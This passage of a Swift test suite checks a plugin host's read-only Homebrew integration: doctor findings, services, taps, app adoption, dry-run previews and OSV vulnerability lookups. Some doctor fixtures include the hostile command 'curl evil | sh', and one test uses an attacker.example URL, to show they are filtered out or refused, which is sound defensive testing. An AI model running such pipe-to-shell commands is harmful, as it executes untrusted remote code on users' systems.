import SpinnetTestSupport
import XCTest
import SpinnetCore
import SpinnetPluginTestKit

final class HomebrewManagementReadTests: XCTestCase {
    func testVersionReadReturnsTypedAvailabilityWithoutStartingAMutation() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, arguments, _, _ in
            XCTAssertEqual(arguments, ["--version"])
            return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("version")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/version"), .string("7.0.0"))
        XCTAssertEqual(result.value(atPointer: "/features/vulnerabilities"), .bool(true))
    }
}

extension HomebrewManagementReadTests {
    func testDoctorNeverOffersATruncatedCommandForCopyAndNamesTheReviewedBatch() throws {
        let longCommand = "brew link " + String(repeating: "a", count: 600)
        let report: [String: Any] = ["findings": [["text": "Unlinked tools", "remediation": ["commands": [longCommand, "brew link wget"]]]]]
        let bytes = try JSONSerialization.data(withJSONObject: report)
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            return .init(status: 1, stdout: bytes)
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("doctor")]), owner: PluginID("doctor-complete-copy"))
        XCTAssertEqual(result.value(atPointer: "/findings/0/commands"), .array([.string("brew link wget")]))
        XCTAssertEqual(result.value(atPointer: "/findings/0/truncated"), .bool(true))
        XCTAssertEqual(result.value(atPointer: "/fix_all/repairs"), .array([.object(["title": .string("Link wget")])]))
    }

    func testDoctorRechecksSandboxPermissionWarningsBeforeIssuingRepairs() throws {
        var writable: Bool? = true
        let targets = HomebrewManagementTargets()
        let management = HomebrewManagementReads(targets: targets, doctorDirectoryWritable: { url in
            XCTAssertEqual(url.path, "/opt/homebrew/Caskroom")
            return writable
        })
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            return .init(status: 1, stdout: Data(#"{"tier":1,"findings":[{"check":"check_cask_staging_location","text":"The staging path /opt/homebrew/Caskroom is not writable by the current user.\n","remediation":{"text":"To fix this, run the suggested ownership command.","commands":["sudo chown -R $(whoami) /opt/homebrew/Caskroom"]}}]}"#.utf8))
        }, management: management)
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("doctor")])
        let owner = PluginID("doctor-writability")
        let restricted = try profile.read(input, owner: owner)
        XCTAssertEqual(restricted.value(atPointer: "/findings"), .array([]))
        XCTAssertNil(restricted.value(atPointer: "/fix_all"))
        writable = false
        let actual = try profile.read(input, owner: owner)
        XCTAssertEqual(actual.value(atPointer: "/findings/0/affects"), .array([.string("/opt/homebrew/Caskroom")]))
        XCTAssertNil(actual.value(atPointer: "/fix_all"))
        XCTAssertEqual(actual.value(atPointer: "/findings/0/commands/0"), .string("sudo chown -R " + NSUserName() + " /opt/homebrew/Caskroom"))
        writable = nil
        let unavailable = try profile.read(input, owner: owner)
        XCTAssertEqual(unavailable.value(atPointer: "/findings"), .array([]))
        XCTAssertNil(unavailable.value(atPointer: "/fix_all"))
        XCTAssertEqual(unavailable.value(atPointer: "/context/unverified_directory_checks"), .number(1))
    }

    func testServicesReadOnlyShowsCurrentUsersServicesWithoutFileOrAccountLeakage() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["services", "list", "--json"])
            return HomebrewReadOutput(status: 0, stdout: Data("""
            [{"name":"postgresql@17","status":"started","user":"\(NSUserName())","file":"/private/user/launch.plist"},
            {"name":"root-service","status":"started","user":"root","file":"/Library/LaunchDaemons/root.plist"}]
            """.utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("services")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/services/0/name"), .string("postgresql@17"))
        XCTAssertNil(result.value(atPointer: "/services/1"))
        XCTAssertNil(result.value(atPointer: "/services/0/file"))
        XCTAssertNil(result.value(atPointer: "/services/0/user"))
    }
}

extension HomebrewManagementReadTests {
    func testTapStatusNeverAssumesAnOfficialNameImpliesTrust() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["tap-info", "--installed", "--json=v1"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"[{"name":"homebrew/core","official":true,"trusted":false,"remote":"https://github.com/changed/source","formula_names":["wget"],"cask_tokens":[]}]"#.utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("taps")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/taps/0/trusted"), .bool(false))
        XCTAssertEqual(result.value(atPointer: "/taps/0/formula_count"), .number(1))
    }
}

extension HomebrewManagementReadTests {
    func testDoctorPreservesFindingStructureAndExcludesHostShellPathAdvice() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            return .init(status: 1, stdout: Data(#"{"tier":1,"findings":[{"check":"check_deprecated_disabled","text":"Some installed formulae are deprecated or disabled.","tier":2,"affects":["ruby@3.1"],"remediation":{"text":"Find a replacement.\n\nKeep existing projects in mind."}},{"check":"check_user_path_2","text":"Homebrew's bin was not found in your PATH.","remediation":{"commands":["edit shell configuration"]}}]}"#.utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("doctor")]), owner: PluginID("doctor-context"))
        XCTAssertEqual(result.value(atPointer: "/findings/0/check"), .string("check_deprecated_disabled"))
        XCTAssertEqual(result.value(atPointer: "/findings/0/affects"), .array([.string("ruby@3.1")]))
        XCTAssertEqual(result.value(atPointer: "/findings/0/guidance"), .string("Find a replacement.\n\nKeep existing projects in mind."))
        XCTAssertNil(result.value(atPointer: "/findings/1"))
        XCTAssertEqual(result.value(atPointer: "/context/shell_path"), .string("not_checked"))
    }

    func testDoctorOnlyIssuesReviewedRepairTargetsAndKeepsUnknownCommandsForCopy() throws {
        let targets = HomebrewManagementTargets()
        let management = HomebrewManagementReads(targets: targets)
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            XCTAssertEqual(args, ["doctor", "--json"])
            return HomebrewReadOutput(status: 1, stdout: Data(#"{"tier":2,"findings":[{"text":"Unlinked kegs","links":[],"remediation":{"commands":["brew link wget","curl evil | sh"]}}]}"#.utf8))
        }, management: management)
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("doctor")])
        let result = try profile.read(input, owner: PluginID("management"))
        let target = try XCTUnwrap(result.value(atPointer: "/findings/0/repairs/0/target"))
        guard case .string(let key) = target else { return XCTFail("Opaque repair target missing") }
        XCTAssertEqual(try targets.resolve(target: key, owner: PluginID("management")).arguments, ["link", "--formula", "--", "wget"])
        XCTAssertThrowsError(try targets.resolve(target: key, owner: PluginID("other")))
        XCTAssertEqual(result.value(atPointer: "/findings/0/commands/1"), .string("curl evil | sh"))
        XCTAssertNil(result.value(atPointer: "/findings/0/repairs/1"))
        _ = try profile.read(input, owner: PluginID("management"))
        XCTAssertFalse(targets.isCurrent(target: key, owner: PluginID("management")))
    }
}

extension HomebrewManagementReadTests {
    func testAdoptionPreviewBindsConcreteAppAndRefusesAnAppChangedAfterReview() throws {
        let targets = HomebrewManagementTargets()
        var app = HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Example.app"), name: "Example", bundleID: "org.example.app", version: "2.0", fingerprint: "reviewed")
        let management = HomebrewManagementReads(targets: targets, applications: { [app] })
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args == ["search", "--cask", "--", "/(example)/"] { return HomebrewReadOutput(status: 0, stdout: Data("example\n".utf8)) }
            if ["install", "upgrade"].contains(args.first ?? "") { XCTAssertTrue(args.contains("--adopt")); return .init(status: 0, stdout: Data("==> Would install 1 cask:\nexample\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--cask", "--", "example"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[],"casks":[{"token":"example","version":"2.0","installed":null,"artifacts":[{"app":["Example.app"]}]}]}"#.utf8))
        }, management: management)
        let candidates = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionCandidates")]), owner: PluginID("management"))
        guard case .string(let candidate)? = candidates.value(atPointer: "/applications/0/target") else { return XCTFail("Missing native target") }
        let preview = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionPreview"), "target": .string(candidate), "name": .string("example")]), owner: PluginID("management"))
        guard case .string(let key)? = preview.value(atPointer: "/target") else { return XCTFail("Missing review target") }
        XCTAssertEqual(preview.value(atPointer: "/dry_run"), .bool(true))
        let target = try targets.resolve(target: key, owner: PluginID("management"))
        XCTAssertEqual(target.arguments, ["install", "--cask", "--adopt", "--", "example"])
        XCTAssertEqual(target.metadata.value(atPointer: "/adopt"), .bool(true))
        app = HomebrewAdoptionApplication(url: app.url, name: app.name, bundleID: app.bundleID, version: "3.0", fingerprint: "changed")
        XCTAssertFalse(targets.isCurrent(target: key, owner: PluginID("management")))
    }
}

extension HomebrewManagementReadTests {
    func testInstallPreviewRunsActualDryRunAndPreservesDependenciesAndWarnings() throws {
        var dryRuns = 0
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.8\n".utf8)) }
            if args.first == "info" { return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"wget","tap":"homebrew/core","versions":{"stable":"1.25"},"dependencies":["libidn2","openssl@3"],"installed":[]}],"casks":[]}"#.utf8)) }
            XCTAssertEqual(args, ["install", "--dry-run", "--formula", "--", "wget"])
            dryRuns += 1
            return HomebrewReadOutput(status: 0, stdout: Data("==> Would install 1 formula:\nwget 1.25\n==> Would install 2 dependencies for wget:\nlibidn2 openssl@3\n".utf8), stderr: Data("Warning: openssl@3 is keg-only\n".utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("previewInstall"), "kind": .string("formula"), "names": .array([.string("wget")])]), owner: PluginID("management"))
        XCTAssertEqual(dryRuns, 1)
        XCTAssertEqual(result.value(atPointer: "/estimated"), .bool(false))
        XCTAssertEqual(result.value(atPointer: "/stages/1/title"), .string("Would install 2 dependencies for wget:"))
        XCTAssertEqual(result.value(atPointer: "/warnings/0"), .string("Warning: openssl@3 is keg-only"))
        XCTAssertEqual(result.value(atPointer: "/packages/0/dependencies/1"), .string("openssl@3"))
    }

}

private struct ManagementMetadataTransport: HTTPSTransport {
    let reply: (HTTPSTransportRequest) throws -> HTTPSTransportResponse
    func send(_ request: HTTPSTransportRequest) throws -> HTTPSTransportResponse { try reply(request) }
}
extension HomebrewManagementReadTests {
    func testAdvisoryDetailUsesOnlyReviewedOSVURLAndRetainsUsefulBoundedDetail() throws {
        let network = ManagementMetadataTransport { request in
            XCTAssertEqual(request.url.absoluteString, "https://api.osv.dev/v1/vulns/CVE-2026-1234")
            XCTAssertEqual(request.maximumResponseBytes, 128 * 1024)
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"CVE-2026-1234","summary":"Example advisory","details":"Upgrade the affected library","database_specific":{"severity":"HIGH"},"affected":[{"ranges":[{"events":[{"introduced":"1.0"},{"fixed":"2.0"}]}]}],"references":[{"url":"https://example.org/advisory"}]}"#.utf8))
        }
        let management = HomebrewManagementReads(transport: network)
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            XCTAssertEqual(args, ["--version"])
            return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: management)
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("CVE-2026-1234")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/advisory/details"), .string("Upgrade the affected library"))
        XCTAssertEqual(result.value(atPointer: "/advisory/fixed_versions/0"), .string("2.0"))
    }
}

extension HomebrewManagementReadTests {
    func testFreshVulnerabilityReadQueriesInstalledSBOMVersionNotCurrentRecipe() throws {
        let prefix = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let path = prefix.appendingPathComponent("Cellar/example/1.0/sbom.spdx.json")
        try FileManager.default.createDirectory(at: path.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(#"{"packages":[{"SPDXID":"SPDXRef-Archive-example-src","downloadLocation":"https://github.com/example/project/archive/refs/tags/v1.0.tar.gz","versionInfo":"1.0"}]}"#.utf8).write(to: path)
        defer { try? FileManager.default.removeItem(at: prefix) }
        let network = ManagementMetadataTransport { request in
            if request.url.path == "/v1/querybatch" {
                let body = try JSONDecoder().decode(JSONValue.self, from: XCTUnwrap(request.body))
                XCTAssertEqual(body.value(atPointer: "/queries/0/version"), .string("v1.0"))
                XCTAssertEqual(body.value(atPointer: "/queries/0/package/name"), .string("https://github.com/example/project"))
                return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"results":[{"vulns":[{"id":"CVE-2026-1234"}]}]}"#.utf8))
            }
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"CVE-2026-1234","summary":"Installed version affected","affected":[{"ranges":[{"events":[{"fixed":"2.0"}]}]}]}"#.utf8))
        }
        let management = HomebrewManagementReads(transport: network)
        let profile = HomebrewReadProfile(executable: { prefix.appendingPathComponent("bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args == ["list", "--formula", "--versions"] { return HomebrewReadOutput(status: 0, stdout: Data("example 1.0\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "example"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"example","versions":{"stable":"2.0"},"revision":0,"patches":[],"outdated":true,"pinned":false}]}"#.utf8))
        }, management: management)
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilities")]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/checked"), .number(1))
        XCTAssertEqual(result.value(atPointer: "/findings/0/installed_version"), .string("1.0"))
        XCTAssertEqual(result.value(atPointer: "/findings/0/advisories/0/fixed_versions/0"), .string("2.0"))
    }
}

extension HomebrewManagementReadTests {
    func testGHSAAdvisoryIDsWithLowercaseComponentsAreAcceptedButURLsAreRefused() throws {
        let network = ManagementMetadataTransport { request in
            XCTAssertEqual(request.url.path, "/v1/vulns/GHSA-vqj2-4v8m-8vrq")
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"GHSA-vqj2-4v8m-8vrq","summary":"Known advisory"}"#.utf8))
        }
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, _, _, _ in
            HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: HomebrewManagementReads(transport: network))
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("GHSA-vqj2-4v8m-8vrq")])
        XCTAssertEqual(try profile.read(input, owner: PluginID("management")).value(atPointer: "/advisory/id"), .string("GHSA-vqj2-4v8m-8vrq"))
        XCTAssertThrowsError(try HomebrewReadInput(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("https://attacker.example/advisory")])))
    }
}

extension HomebrewManagementReadTests {
    func testPublishedManagementFixturesEnforceTypedInputsAndResults() throws {
        let api = TestRepository.root.appendingPathComponent("PluginAPI")
        struct Entry: Decodable { let file: String; let definition: String; let valid: Bool }
        struct Index: Decodable { let fixtures: [Entry] }
        let folder = api.appendingPathComponent("fixtures/homebrew-management")
        for entry in try JSONDecoder().decode(Index.self, from: Data(contentsOf: folder.appendingPathComponent("index.json"))).fixtures {
            let validator = try JSONSchemaSubsetValidator(definition: entry.definition, inSchemaAt: api.appendingPathComponent("schemas/homebrew-management-reads.schema.json"))
            let value = try JSONDecoder().decode(JSONValue.self, from: Data(contentsOf: folder.appendingPathComponent(entry.file)))
            XCTAssertEqual(validator.errors(for: value).isEmpty, entry.valid, entry.file)
        }
    }
}

extension HomebrewManagementReadTests {
    func testCancellingRemoteReadRefusesItsLateMetadataAnswer() throws {
        let cancellation = HostFetchedSections.Cancellation()
        let network = ManagementMetadataTransport { _ in
            cancellation.cancel()
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"CVE-2023-38545"}"#.utf8))
        }
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, _, _, _ in
            HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: HomebrewManagementReads(transport: network))
        XCTAssertThrowsError(try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilityDetail"), "id": .string("CVE-2023-38545")]), owner: PluginID("management"), cancellation: cancellation)) { error in
            XCTAssertEqual(error as? PluginHostServiceError, .unavailable("The reviewed read was cancelled"))
        }
    }
}

extension HomebrewManagementReadTests {
    func testNewManagementSourceRunsThroughRealHelperAndRecordedHostBoundary() throws {
        let root = TestRepository.root
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString + ".spinnetplugin")
        defer { try? FileManager.default.removeItem(at: directory) }
        try FileManager.default.copyItem(at: root.appendingPathComponent("Tests/Fixtures/ReviewedToolsProbe.spinnetplugin"), to: directory)
        let manifestURL = directory.appendingPathComponent("manifest.json")
        var manifest = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: manifestURL)) as? [String: Any])
        var scopes = try XCTUnwrap(manifest["capability_scopes"] as? [[String: Any]])
        var tools = try XCTUnwrap(scopes[0]["reviewed_tools"] as? [[String: Any]])
        tools[0]["operations"] = ["version"]
        scopes[0]["reviewed_tools"] = tools; manifest["capability_scopes"] = scopes
        try JSONSerialization.data(withJSONObject: manifest).write(to: manifestURL)
        try """
        spinnet.ui.showPage(spinnet.ui.page({id:"management",title:"Homebrew",sources:[spinnet.tools.read.source("brew",{tool:"homebrew",operation:"version"})],content:[spinnet.ui.components.text({id:"version",text:"Waiting",bind:spinnet.ui.components.bind("brew","/version")})]}))
        """.write(to: directory.appendingPathComponent("read.js"), atomically: true, encoding: .utf8)
        let plugin = try PluginUnderTest(packageAt: directory)
        let helper = try PluginTestHelper(); defer { helper.shutdown() }
        let invocation = PluginTestInvocation("probe.read")
        let page = try XCTUnwrap(try helper.run(invocation, of: plugin, answering: RecordedHostServices()).answer().description)
        let source = try RecordedHostSources(of: plugin, for: invocation, operations: ["tools.read": .value(.object(["tool": .string("homebrew"), "operation": .string("version"), "version": .string("7.0.0")]))])
        try source.present(page); source.setVisible(true)
        XCTAssertEqual(source.shown("version")?.text, "7.0.0")
        source.close()
    }
}

extension HomebrewManagementReadTests {
    func testBatchPreviewExcludesPinsAndCoversBothKindsWithGreedyChoice() throws {
        var calls: [[String]] = []
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            calls.append(args)
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.8\n".utf8)) }
            if args.first == "outdated" { return .init(status: 0, stdout: Data(#"{"formulae":[{"name":"wget","pinned":false},{"name":"openssl@3","pinned":true}],"casks":[{"name":"spotify","pinned":false}]}"#.utf8)) }
            if args.first == "info" {
                return .init(status: 0, stdout: Data((args.contains("--cask") ? #"{"formulae":[],"casks":[{"token":"spotify","tap":"homebrew/cask","version":"2.0","installed":"1.0"}]}"# : #"{"formulae":[{"name":"wget","tap":"homebrew/core","versions":{"stable":"1.25"},"installed":[{"version":"1.24"}]}],"casks":[]}"#).utf8))
            }
            return .init(status: 0, stdout: Data("==> Would upgrade 1 package:\nexample 1.0 -> 2.0 (2 MB)\n".utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("previewUpgradeAll"), "greedy": .bool(true)]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/packages/0/name"), .string("wget"))
        XCTAssertEqual(result.value(atPointer: "/packages/1/name"), .string("spotify"))
        let dry = calls.filter { $0.first == "upgrade" }
        XCTAssertEqual(dry.count, 2)
        XCTAssertTrue(dry.contains { $0.contains("--cask") && $0.contains("--greedy") })
        XCTAssertFalse(dry.contains { $0.contains("openssl@3") })
        XCTAssertEqual(result.value(atPointer: "/dry_run"), .bool(true))
    }

    func testUntrustedQualifiedPreviewIsRefusedBeforeExecutingDryRun() throws {
        var dryRuns = 0
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.8\n".utf8)) }
            if args.first == "info" { return .init(status: 0, stdout: Data(#"{"formulae":[{"name":"wget","full_name":"acme/tools/wget","tap":"acme/tools","versions":{"stable":"1.25"},"installed":[]}],"casks":[]}"#.utf8)) }
            if args.first == "trust" { return .init(status: 0, stdout: Data("[]".utf8)) }
            if args.first == "host-trust" { return .init(status: 0, stdout: Data("[]".utf8)) }
            dryRuns += 1
            return .init(status: 0, stdout: Data())
        })
        XCTAssertThrowsError(try profile.read(.object(["tool": .string("homebrew"), "operation": .string("previewInstall"), "kind": .string("formula"), "names": .array([.string("acme/tools/wget")])]), owner: PluginID("management"))) { XCTAssertEqual($0 as? PluginHostServiceError, .tool(.sourceNotAllowed)) }
        XCTAssertEqual(dryRuns, 0)
    }
}

extension HomebrewManagementReadTests {
}

extension HomebrewManagementReadTests {
    func testDocumentedManagementFixturesAgreeWithPublicInputAndResultSchemas() throws {
        let root = TestRepository.root.appendingPathComponent("PluginAPI")
        let directory = root.appendingPathComponent("fixtures/homebrew-management")
        let index = try JSONDecoder().decode(JSONValue.self, from: Data(contentsOf: directory.appendingPathComponent("index.json")))
        guard case .array(let fixtures)? = index.value(atPointer: "/fixtures") else { return XCTFail("Missing fixtures") }
        for fixture in fixtures {
            guard case .string(let file)? = fixture.value(atPointer: "/file"), case .string(let definition)? = fixture.value(atPointer: "/definition"), case .bool(let valid)? = fixture.value(atPointer: "/valid") else { return XCTFail("Invalid index") }
            let value = try JSONDecoder().decode(JSONValue.self, from: Data(contentsOf: directory.appendingPathComponent(file)))
            let validator = try JSONSchemaSubsetValidator(definition: definition, inSchemaAt: root.appendingPathComponent("schemas/homebrew-management-reads.schema.json"))
            XCTAssertEqual(validator.errors(for: value).isEmpty, valid, file)
            if definition == "input" { XCTAssertEqual((try? HomebrewReadInput(value)) != nil, valid, file) }
        }
    }
}

extension HomebrewManagementReadTests {
    func testDoctorFixAllFreezesOnlyReviewedRepairsAndExpiresWithReport() throws {
        let targets = HomebrewManagementTargets()
        let management = HomebrewManagementReads(targets: targets)
        let owner = PluginID("management")
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            return HomebrewReadOutput(status: 1, stdout: Data(#"{"tier":2,"findings":[{"text":"Repairs","remediation":{"commands":["brew link wget","brew cleanup","curl evil | sh","brew link wget"]}}]}"#.utf8))
        }, management: management)
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("doctor")])
        let result = try profile.read(input, owner: owner)
        guard case .string(let key)? = result.value(atPointer: "/fix_all/target") else { return XCTFail("Missing reviewed repair set") }
        XCTAssertEqual(result.value(atPointer: "/fix_all/count"), .number(2))
        let batch = try targets.resolve(target: key, owner: owner)
        XCTAssertEqual(batch.metadata.value(atPointer: "/doctor_steps/0/input/operation"), .string("link"))
        XCTAssertEqual(batch.metadata.value(atPointer: "/doctor_steps/1/input/operation"), .string("cleanup"))
        XCTAssertNil(batch.metadata.value(atPointer: "/doctor_steps/2"))
        _ = try profile.read(input, owner: owner)
        XCTAssertFalse(targets.isCurrent(target: key, owner: owner))
    }
}

extension HomebrewManagementReadTests {
    func testVulnerabilitiesSeparateInstalledRecipePatchesFromOlderKegs() throws {
        let prefix = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: prefix) }
        for version in ["1.0", "2.0_1"] {
            let path = prefix.appendingPathComponent("Cellar/example/" + version + "/sbom.spdx.json")
            try FileManager.default.createDirectory(at: path.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(#"{"packages":[{"SPDXID":"SPDXRef-Archive-example-src","downloadLocation":"https://github.com/example/project/archive/refs/tags/v1.0.tar.gz","versionInfo":"1.0"}]}"#.utf8).write(to: path)
        }
        let network = ManagementMetadataTransport { request in
            if request.url.path == "/v1/querybatch" { return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"results":[{"vulns":[{"id":"GHSA-abcd-1234-5678"}]}]}"#.utf8)) }
            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"GHSA-abcd-1234-5678","aliases":["CVE-2026-1234"],"summary":"Patched issue"}"#.utf8))
        }
        var installedVersion = "2.0_1"
        let profile = HomebrewReadProfile(executable: { prefix.appendingPathComponent("bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args == ["list", "--formula", "--versions"] { return HomebrewReadOutput(status: 0, stdout: Data("example \(installedVersion)\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "example"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"example","versions":{"stable":"2.0"},"revision":1,"outdated":true,"pinned":false,"patches":[{"resolves":[{"type":"security","id":"CVE-2026-1234"}]}]}],"casks":[]}"#.utf8))
        }, management: HomebrewManagementReads(transport: network))
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("vulnerabilities")])
        let current = try profile.read(input, owner: PluginID("security"))
        XCTAssertEqual(current.value(atPointer: "/findings/0/advisories/0/status"), .string("patched"))
        XCTAssertEqual(current.value(atPointer: "/findings/0/patched_count"), .number(1))
        installedVersion = "1.0"
        let older = try profile.read(input, owner: PluginID("security"))
        XCTAssertEqual(older.value(atPointer: "/findings/0/advisories/0/status"), .string("open"))
        XCTAssertEqual(older.value(atPointer: "/findings/0/upgrade_available"), .bool(true))
    }
}

extension HomebrewManagementReadTests {
    func testAdoptionCandidatesAutomaticallyMatchBoundedCasksAndExposeConfidenceWithoutPaths() throws {
        let apps = [HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Example.app"), name: "Example", bundleID: "org.example.app", version: "2.0", fingerprint: "current"), HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Old.app"), name: "Old", bundleID: "org.old.app", version: "1.0", fingerprint: "old")]
        let management = HomebrewManagementReads(targets: HomebrewManagementTargets(), applications: { apps })
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            if args.first == "search" { return HomebrewReadOutput(status: 0, stdout: Data("example\nold\n".utf8)) }
            XCTAssertEqual(args, ["info", "--json=v2", "--cask", "--", "example", "old"])
            return HomebrewReadOutput(status: 0, stdout: Data(#"{"casks":[{"token":"example","version":"2.0","installed":null,"artifacts":[{"app":["Example.app"]},{"uninstall":[{"quit":"org.example.app"}]}]},{"token":"old","version":"2.0","installed":null,"artifacts":[{"app":["Old.app"]}]}]}"#.utf8))
        }, management: management)
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionCandidates")]), owner: PluginID("adoption"))
        XCTAssertEqual(result.value(atPointer: "/applications/0/candidates/0/name"), .string("example"))
        XCTAssertEqual(result.value(atPointer: "/applications/0/candidates/0/confidence"), .string("ready"))
        XCTAssertEqual(result.value(atPointer: "/applications/1/candidates/0/confidence"), .string("cannot"))
        XCTAssertNil(result.value(atPointer: "/applications/0/path"))
    }
}

extension HomebrewManagementReadTests {
    func testSelectedPackageAnalyticsSupportBoundedPopularityRankingWithoutCatalogueRoute() throws {
        let network = ManagementMetadataTransport { request in
            XCTAssertTrue(["https://formulae.brew.sh/api/formula/wget.json", "https://formulae.brew.sh/api/formula/curl.json"].contains(request.url.absoluteString))
            let count = request.url.path.contains("wget") ? 12 : 500
